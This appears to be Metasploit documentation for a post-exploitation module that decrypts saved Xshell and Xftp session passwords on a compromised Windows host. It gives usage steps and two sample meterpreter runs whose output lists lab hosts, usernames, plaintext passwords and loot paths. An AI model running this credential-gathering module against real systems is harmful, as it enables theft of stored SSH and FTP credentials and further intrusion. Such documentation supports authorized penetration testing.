## Vulnerable Application

This module can decrypt the password of xshell and xftp, If the user chooses to remember the password.

  Analysis of encryption algorithm [here](https://github.com/HyperSine/how-does-Xmanager-encrypt-password).

  You can find its official website [here](https://www.netsarang.com/).

## Verification Steps

  1. Download the latest installer of Xshell or Xftp.
  2. Use xshell to log in to ssh or xftp to log in to ftp.
  3. Remember to save the account password.
  4. Get a `meterpreter` session on a Windows host.
  5. Do: ```run post/windows/gather/credentials/xshell_xftp_password```
  6. If the session file is saved in the system, the host, port, user name and plaintext password will be printed.

## Options

 **MASTER_PASSWORD**

  - Specify user's master password, e.g.:123456'

## Scenarios

```
meterpreter > run post/windows/gather/credentials/xshell_xftp_password 

[*] Gather Xshell and Xftp Passwords on WIN-A18RNMNL9C2
[-] Unexpected Windows error 1332
[*] Search session files on C:\Users\Administrator\Documents\NetSarang
[*] Search session files on C:\Users\Administrator\Documents\NetSarang Computer\6
[-] Invalid MASTER_PASSWORD, Decryption failed!
Xshell and Xftp Password
========================

Type         Name              Host            Port  UserName  Plaintext  Password
----         ----              ----            ----  --------  ---------  --------
Xftp_V5.3    session.xfp      192.168.76.1    2121  lftpd     lftpd      yhmb27u7ThR1+BNb5T+/aaps3NvoY3zmr7pVLjWIgfdsyVeHMA==
Xftp_V5.3    session.xfp      192.168.76.1    2121  lftpd                sQsnGxC7ThR1+BNb5T+/aaps3NvoY3zmr7pVLjWIgfdsyVeHMA==
Xshell_V5.3  session.xsh      192.168.76.134  22    kt        123456     l03cn+pMjZae727K08KaOmKSgOaGzww/XVqGr/PKEgIMkjrcbJI=
Xshell_V6.0  session.xsh                      22    kt                   

[+] Passwords stored in: /home/kali-team/.msf4/loot/20200610071906_default_192.168.76.132_host.xshell_xftp_138987.txt
meterpreter > 
```

* Specify **MASTER_PASSWORD**

```
meterpreter > run post/windows/gather/credentials/xshell_xftp_password MASTER_PASSWORD=123456

[*] Gather Xshell and Xftp Passwords on WIN-A18RNMNL9C2
[-] Unexpected Windows error 1332
[*] Search session files on C:\Users\Administrator\Documents\NetSarang
[*] Search session files on C:\Users\Administrator\Documents\NetSarang Computer\6
Xshell and Xftp Password
========================

Type         Name              Host            Port  UserName  Plaintext  Password
----         ----              ----            ----  --------  ---------  --------
Xftp_V5.3    session.xfp      192.168.76.1    2121  lftpd     lftpd      yhmb27u7ThR1+BNb5T+/aaps3NvoY3zmr7pVLjWIgfdsyVeHMA==
Xftp_V5.3    session.xfp      192.168.76.1    2121  lftpd     lftpd      sQsnGxC7ThR1+BNb5T+/aaps3NvoY3zmr7pVLjWIgfdsyVeHMA==
Xshell_V5.3  session.xsh      192.168.76.134  22    kt        123456     l03cn+pMjZae727K08KaOmKSgOaGzww/XVqGr/PKEgIMkjrcbJI=
Xshell_V6.0  session.xsh                      22    kt                   

[+] Passwords stored in: /home/kali-team/.msf4/loot/20200610072134_default_192.168.76.132_host.xshell_xftp_307846.txt
meterpreter > 

```